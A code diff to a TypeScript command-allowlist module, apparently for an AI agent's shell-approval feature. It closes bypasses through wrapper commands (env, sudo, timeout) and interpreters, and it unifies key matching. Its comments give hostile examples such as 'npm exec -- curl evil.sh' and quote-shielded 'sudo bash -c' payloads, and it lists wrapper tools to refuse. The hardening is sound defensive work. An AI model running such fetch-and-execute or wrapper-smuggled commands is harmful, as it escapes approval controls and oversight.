@@ -43,8 +43,9 @@ export function commandTokens(command: string): string[] {
 
 /** Package managers where the subcommand needs one extra token (`npm run build`):
  *  the key keeps `run` + the script name, so an entry never degenerates to
- *  `npm run` (= every script). */
-const RUN_SUBCOMMANDS = new Set(['npm', 'pnpm', 'yarn', 'bun', 'pnpm.exe', 'npm.cmd', 'yarn.cmd'])
+ *  `npm run` (= every script). Matched through baseCommandName, so the
+ *  `.exe`/`.cmd`/`.bat` spellings collapse into one set. */
+const RUN_SUBCOMMANDS = new Set(['npm', 'pnpm', 'yarn', 'bun'])
 
 /** Interpreters and shells (basename, extension stripped, lowercased): every
  *  argument after one is a program to execute, so NO prefix of such a command
@@ -73,8 +74,17 @@ const EVAL_FLAGS = new Set(['-c', '-e', '--eval', '-lc', '-Command', '-command',
  *  `npm exec -- tsc`, `pnpm dlx prettier`, `bun x vitest`): the key must pin
  *  the package, never the runner alone — an entry of bare `npm exec` would
  *  exempt `npm exec -- curl evil.sh` (npm exec downloads and runs any package). */
-const PACKAGE_RUNNERS = new Set(['npx', 'npx.cmd', 'bunx', 'bunx.cmd'])
+const PACKAGE_RUNNERS = new Set(['npx', 'bunx'])
 const PACKAGE_RUN_SUBCOMMANDS = new Set(['exec', 'dlx', 'x'])
+
+/** Wrappers whose tail is a PROGRAM to execute (`env FOO=1 bash -c …`,
+ *  `sudo bash -c …` — the exact shape the command builder's own `sudo:true`
+ *  produces on Linux — `timeout 10 curl …`, `corepack pnpm dlx …`): whatever
+ *  sits behind the wrapper re-binds what runs, so no prefix of the line
+ *  narrows anything. Keying them as wrapper + first tail token (`env bash`,
+ *  `sudo bash`, `timeout 10`) meant one approval exempted the wrapper family
+ *  whole — quote-shielded payloads included (review_20260929 高1). */
+const WRAPPER_PREFIXES = new Set(['env', 'sudo', 'nohup', 'nice', 'stdbuf', 'timeout', 'command', 'xargs', 'corepack'])
 
 function baseCommandName(token: string): string {
   const last = token.split(/[\\/]/).pop() ?? token
@@ -105,6 +115,10 @@ function isInterpreter(token: string): boolean {
  *   family (review_20260928 高2);
  * - any command whose second token is an eval flag (`-c`/`-e`/`-Command`/…):
  *   the payload IS the command;
+ * - wrapper-prefixed lines (`env bash -c …`, `sudo bash -c …`, `timeout 10 …`)
+ *   and any line whose second token is an interpreter: the wrapper or the head
+ *   binary re-binds what the tail runs, so the interpreter/eval-flag defense
+ *   cannot sit on fixed slots (review_20260929 高1);
  * - package runners, unless the key pins the package (`npm exec tsc`, never
  *   bare `npm exec`; flags before the package are one-shot).
  */
@@ -112,7 +126,7 @@ export function commandAllowlistKey(command: string): string | null {
   if (hasShellOperators(command)) return null
   const tokens = commandTokens(command)
   if (tokens.length === 0) return null
-  if (RUN_SUBCOMMANDS.has(tokens[0])) {
+  if (RUN_SUBCOMMANDS.has(baseCommandName(tokens[0]))) {
     // The runner itself is a meta-executor: the key must pin a subcommand (and
     // for `run`, the script). Flags in the second slot configure the runner
     // (`npm --prefix ./app test`) — pinning nothing there would exempt the
@@ -132,38 +146,33 @@ export function commandAllowlistKey(command: string): string | null {
   if (PACKAGE_RUNNERS.has(baseCommandName(tokens[0]))) {
     return tokens.length > 1 && !tokens[1].startsWith('-') ? `${tokens[0]} ${tokens[1]}` : null
   }
+  if (WRAPPER_PREFIXES.has(baseCommandName(tokens[0]))) return null
   if (tokens.length > 1 && EVAL_FLAGS.has(tokens[1])) return null
-  if (isInterpreter(tokens[0])) return null
+  if (isInterpreter(tokens[0]) || (tokens.length > 1 && isInterpreter(tokens[1]))) return null
   let depth = 1
   if (tokens.length > 1 && !tokens[1].startsWith('-')) depth = 2
   return tokens.slice(0, depth).join(' ')
 }
 
-/** Whether `command` starts with any stored entry, token-wise. The entry is
- *  itself a key (1–3 tokens), so comparison walks the entry's tokens against
- *  the command's: appended args match, a longer token in the same position
- *  (`test:ci` vs `test`) does not. A command carrying operators never matches —
- *  an approved prefix must not ride past a `&&`/`;` chain it was never
- *  approved with (the write side refuses them; this is the matching side of
- *  the same rule). */
+/** Whether `command` is approved by any stored entry. Both sides go through
+ *  the SAME key function (review_20260929 中1): the stored entry IS a key, so
+ *  comparing it against the candidate's own key is one normalization applied
+ *  to both ends — `npm exec -- tsc` and `npm exec tsc` share the key
+ *  `npm exec tsc`, while the old token-wise compare failed the stored entry
+ *  against the exact command the user had just approved. A command the key
+ *  function refuses (interpreter/wrapper-headed, operators) matches nothing —
+ *  one-shot approval, the matching-side half of the wrapper fix: an entry an
+ *  older version stored (`env bash`) can no longer be ridden by any command.
+ *  Appended arguments still hit: the candidate's key collapses them
+ *  (`npm test -- --watch` keys as `npm test`), while a longer token in a
+ *  keyed slot (`test:ci` vs `test`) keys differently — the token boundary
+ *  lives inside the key function now, single-sourced. */
 export function commandMatchesAllowlist(command: string, entries: Iterable<string>): boolean {
   if (hasShellOperators(command)) return false
-  const tokens = commandTokens(command)
-  if (tokens.length === 0) return false
+  const key = commandAllowlistKey(command)
+  if (key === null) return false
   for (const entry of entries) {
-    // An entry the key function would refuse to store today (a bare
-    // interpreter or runner: `node`, `npm exec`, `npm run`) must not keep
-    // matching — an allowlist persisted by an older version would otherwise
-    // stay live for the whole session. The key function is the single source
-    // of truth for what is storable.
-    if (commandAllowlistKey(entry) === null) continue
-    const entryTokens = entry.trim().split(/\s+/).filter(Boolean)
-    if (entryTokens.length === 0 || entryTokens.length > tokens.length) continue
-    let hit = true
-    for (let i = 0; i < entryTokens.length; i++) {
-      if (tokens[i] !== entryTokens[i]) { hit = false; break }
-    }
-    if (hit) return true
+    if (commandAllowlistKey(entry) === key) return true
   }
   return false
 }
